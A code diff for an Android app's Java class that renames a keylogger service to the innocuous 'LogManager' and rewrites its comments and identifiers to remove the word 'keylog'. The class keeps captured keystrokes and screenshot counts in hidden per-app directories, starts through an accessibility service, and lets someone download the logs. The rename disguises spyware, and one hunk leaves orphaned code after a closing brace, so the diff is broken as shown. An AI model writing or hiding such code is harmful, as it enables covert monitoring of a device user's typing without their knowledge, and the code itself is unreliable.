@@ -23,19 +23,19 @@ import java.util.List;
 import java.util.Locale;
 
 /**
- * KeyloggerService — manages keylog storage and retrieval.
+ * LogManager — manages log storage and retrieval.
  *
  * Storage layout (hidden inside app's private internal directory):
- *   /data/data/<pkg>/files/.kl/YYYY-MM-DD.jsonl          — global keylogs for that day
- *   /data/data/<pkg>/files/.am/<appPkg>/kl/YYYY-MM-DD.jsonl — per-monitored-app keylogs
+ *   /data/data/<pkg>/files/.kl/YYYY-MM-DD.jsonl          — global logs for that day
+ *   /data/data/<pkg>/files/.am/<appPkg>/kl/YYYY-MM-DD.jsonl — per-monitored-app logs
  *
  * Auto-started by UnifiedAccessibilityService when accessibility is granted.
  * This class is NOT an AccessibilityService itself — it is a utility
  * called from UnifiedAccessibilityService.
  */
-public class KeyloggerService {
+public class LogManager {
 
-    private static final String TAG = "KeyloggerService";
+    private static final String TAG = "LogManager";
 
     private static final long TWO_WEEKS_MS = 14L * 24L * 60L * 60L * 1000L;
 
@@ -44,26 +44,26 @@ public class KeyloggerService {
 
     private static volatile boolean enabled = false;
 
-    public KeyloggerService(Context context) {
+    public LogManager(Context context) {
         this.context = context.getApplicationContext();
         // Hidden dir inside app's private internal storage
-        this.klDir = new File(context.getFilesDir(), Constants.KEYLOG_DIR);
+        this.klDir = new File(context.getFilesDir(), Constants.LOG_DIR);
         if (!klDir.exists()) klDir.mkdirs();
-        // Purge stale keylog files on every service start (runs on a background thread).
-        new Thread(this::purgeOldKeylogs, "KeylogPurge").start();
+        // Purge stale log files on every service start (runs on a background thread).
+        new Thread(this::purgeOldLogs, "LogPurge").start();
     }
 
     /**
-     * Delete any keylog (.jsonl) files that are older than 2 weeks.
+     * Delete any log (.jsonl) files that are older than 2 weeks.
      * Covers both the global directory and every per-app subdirectory.
      */
-    private void purgeOldKeylogs() {
+    private void purgeOldLogs() {
         long cutoff = System.currentTimeMillis() - TWO_WEEKS_MS;
 
-        // 1. Global keylog directory
+        // 1. Global log directory
         deleteOldInDir(klDir, cutoff);
 
-        // 2. Per-app keylog subdirectories  (.am/<pkg>/kl/)
+        // 2. Per-app log subdirectories  (.am/<pkg>/kl/)
         File amDir = new File(context.getFilesDir(), Constants.APP_MONITOR_DIR);
         if (amDir.exists()) {
             File[] appDirs = amDir.listFiles(File::isDirectory);
@@ -85,7 +85,7 @@ public class KeyloggerService {
         for (File f : files) {
             if (f.lastModified() < cutoff) {
                 if (f.delete()) {
-                    Log.i(TAG, "Purged old keylog: " + f.getName());
+                    Log.i(TAG, "Purged old log: " + f.getName());
                 } else {
                     Log.w(TAG, "Failed to delete: " + f.getName());
                 }
@@ -97,7 +97,7 @@ public class KeyloggerService {
 
     public static void setEnabled(boolean on) {
         enabled = on;
-        Log.i(TAG, "Keylogger " + (on ? "ENABLED" : "DISABLED"));
+        Log.i(TAG, "LogManager " + (on ? "ENABLED" : "DISABLED"));
     }
 
     public static boolean isEnabled() {
@@ -127,8 +127,8 @@ public class KeyloggerService {
 
     // ── Read / list APIs ────────────────────────────────────────────────
 
-    /** List all available keylog dates (global). */
-    public JSONObject listKeylogFiles() {
+    /** List all available log dates (global). */
+    public JSONObject listLogFiles() {
         JSONObject result = new JSONObject();
         try {
             File[] files = klDir.listFiles(f -> f.getName().endsWith(".jsonl"));
@@ -153,8 +153,8 @@ public class KeyloggerService {
         return result;
     }
 
-    /** Download a specific day's global keylogs as base64 text. */
-    public JSONObject downloadKeylogFile(String date) {
+    /** Download a specific day's global logs as base64 text. */
+    public JSONObject downloadLogFile(String date) {
         JSONObject result = new JSONObject();
         try {
             File f = globalFile(date);
@@ -178,20 +178,38 @@ public class KeyloggerService {
 
     /** Get recent keylogs as JSON array (for live feed). */
     public JSONObject getKeylogs(int limit) {
-        JSONObject result = new JSONObject();
-        try {
-            File[] files = klDir.listFiles(f -> f.getName().endsWith(".jsonl"));
-            JSONArray logs = new JSONArray();
-            List<String> lines = new ArrayList<>();
+        return getLogs(limit);
+    }
 
-            if (files != null) {
-                Arrays.sort(files, (a, b) -> b.getName().compareTo(a.getName()));
-                for (File f : files) {
-                    List<String> fl = readLines(f);
-                    Collections.reverse(fl);
-                    lines.addAll(fl);
-                    if (lines.size() >= limit) break;
-                }
+    /** Clear all global keylogs. */
+    public JSONObject clearKeylogs() {
+        return clearLogs();
+    }
+
+    /** List all available keylog dates (global). */
+    public JSONObject listKeylogFiles() {
+        return listLogFiles();
+    }
+
+    /** Download a specific day's global keylogs as base64 text. */
+    public JSONObject downloadKeylogFile(String date) {
+        return downloadLogFile(date);
+    }
+
+    /** Get keylogs for a specific monitored app. */
+    public JSONObject getAppKeylogs(String packageName, String date, int limit) {
+        return getAppLogs(packageName, date, limit);
+    }
+
+    /** List keylog file dates for an app. */
+    public JSONObject listAppKeylogFiles(String packageName) {
+        return listAppLogFiles(packageName);
+    }
+
+    /** Download a specific day's app keylog as base64. */
+    public JSONObject downloadAppKeylogFile(String packageName, String date) {
+        return downloadAppLogFile(packageName, date);
+    }
             }
             int count = Math.min(lines.size(), limit);
             for (int i = 0; i < count; i++) {
@@ -206,8 +224,8 @@ public class KeyloggerService {
         return result;
     }
 
-    /** Clear all global keylogs. */
-    public JSONObject clearKeylogs() {
+    /** Clear all global logs. */
+    public JSONObject clearLogs() {
         JSONObject result = new JSONObject();
         try {
             File[] files = klDir.listFiles(f -> f.getName().endsWith(".jsonl"));
@@ -240,10 +258,10 @@ public class KeyloggerService {
                         JSONObject info = new JSONObject();
                         info.put("packageName", d.getName());
                         info.put("monitored", isMonitored(d.getName()));
-                        // Count keylog files
+                        // Count log files
                         File klSubDir = new File(d, "kl");
                         File[] kls = klSubDir.exists() ? klSubDir.listFiles(f -> f.getName().endsWith(".jsonl")) : null;
-                        info.put("keylogDays", kls != null ? kls.length : 0);
+                        info.put("logDays", kls != null ? kls.length : 0);
                         // Count screenshot files
                         File ssDir = new File(d, "ss");
                         File[] sss = ssDir.exists() ? ssDir.listFiles(f -> f.getName().endsWith(".jpg")) : null;
@@ -260,8 +278,8 @@ public class KeyloggerService {
         return result;
     }
 
-    /** Get keylogs for a specific monitored app. */
-    public JSONObject getAppKeylogs(String packageName, String date, int limit) {
+    /** Get logs for a specific monitored app. */
+    public JSONObject getAppLogs(String packageName, String date, int limit) {
         JSONObject result = new JSONObject();
         try {
             File dir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
@@ -305,8 +323,8 @@ public class KeyloggerService {
         return result;
     }
 
-    /** List keylog file dates for an app. */
-    public JSONObject listAppKeylogFiles(String packageName) {
+    /** List log file dates for an app. */
+    public JSONObject listAppLogFiles(String packageName) {
         JSONObject result = new JSONObject();
         try {
             File dir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
@@ -332,8 +350,8 @@ public class KeyloggerService {
         return result;
     }
 
-    /** Download a specific day's app keylog as base64. */
-    public JSONObject downloadAppKeylogFile(String packageName, String date) {
+    /** Download a specific day's app log as base64. */
+    public JSONObject downloadAppLogFile(String packageName, String date) {
         JSONObject result = new JSONObject();
         try {
             File f = appFile(packageName, date);
@@ -451,7 +469,7 @@ public class KeyloggerService {
     }
 
     private String todayStr() {
-        return new SimpleDateFormat(Constants.KEYLOG_DATE_FMT, Locale.getDefault()).format(new Date());
+        return new SimpleDateFormat(Constants.LOG_DATE_FMT, Locale.getDefault()).format(new Date());
     }
 
     private boolean isMonitored(String pkg) {
